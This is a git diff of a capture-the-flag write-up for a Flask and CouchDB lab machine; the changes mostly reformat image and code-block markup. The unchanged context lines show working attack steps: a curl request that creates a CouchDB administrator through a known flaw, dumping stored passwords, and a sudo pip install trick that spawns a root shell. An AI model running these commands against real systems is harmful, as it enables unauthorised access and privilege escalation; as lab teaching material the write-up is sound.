@@ -49,11 +49,11 @@ There's a `.git` repository present on the website. There is also a domain we ha
 
 The website was a Flask based website:
 
-<figure><img src="../../../.gitbook/assets/image (40).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(40).png>)
 
 We can submit quotes to be viewed on the website through the using specific Simpsons characters:
 
-<figure><img src="../../../.gitbook/assets/image (41).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(41).png>)
 
 Since we have a `.git` repository, we can dump that out first.
 
@@ -151,7 +151,7 @@ Rp4
 
 The reason we split the string by `*` is because of the weird string it generates. Running this gives us a shell:
 
-<figure><img src="../../../.gitbook/assets/image (37).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(37).png>)
 
 ## Privilege Escalation
 
@@ -161,12 +161,10 @@ We cannot read the user's flag yet.
 
 The user was called `homer`, and they were running some processes:
 
-{% code overflow="wrap" %}
 ```
 www-data@canape:/$ ps -elf | grep homer
 4 S homer       610    606  0  80   0 - 162335 -     02:03 ?        00:01:01 /home/homer/bin/../erts-7.3/bin/beam -K true -A 16 -Bd -- -root /home/homer/bin/.. -progname couchdb -- -home /home/homer -- -boot /home/homer/bin/../releases/2.0.0/couchdb -name couchdb@localhost -setcookie monster -kernel error_logger silent -sasl sasl_error_logger false -noshell -noinput -config /home/homer/bin/../releases/2.0.0/sys.config
 ```
-{% endcode %}
 
 CouchDB was being run on the machine, and it is running a vulnerable version.
 
@@ -178,11 +176,9 @@ However, this exploit does not seem to work on the machine. Since this is a DB a
 
 The above uses `curl` to create a new administrator user on the machine.
 
-{% code overflow="wrap" %}
 ```bash
 curl -X PUT 'http://localhost:5984/_users/org.couchdb.user:oops' --data-binary '{"type": "user", "name": "oops", "roles": ["_admin"], "roles": [], "password": "password"}'
 ```
-{% endcode %}
 
 Afterwards, we can read the passwords:
 
@@ -198,16 +194,14 @@ www-data@canape:/$ curl 127.0.0.1:5984/passwords/_all_docs --user 'oops:password
 
 The one on the last row contains a hint about the user's password:
 
-{% code overflow="wrap" %}
 ```
 www-data@canape:/$ curl 127.0.0.1:5984/passwords/739c5ebdf3f7a001bebb8fc438004738 --user 'oops:password'
 {"_id":"739c5ebdf3f7a001bebb8fc438004738","_rev":"1-49a20010e64044ee7571b8c1b902cf8c","user":"homerj0121","item":"github","password":"STOP STORING YOUR PASSWORDS HERE -Admin"}
 ```
-{% endcode %}
 
 With this, we can `ssh` in as `homer` using the password from the other fields:
 
-<figure><img src="../../../.gitbook/assets/image (38).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(38).png>)
 
 ### Sudo Pip -> Root
 
@@ -232,6 +226,6 @@ echo "import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')"
 sudo pip install $TF
 ```
 
-<figure><img src="../../../.gitbook/assets/image (39).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(39).png>)
 
 Rooted!
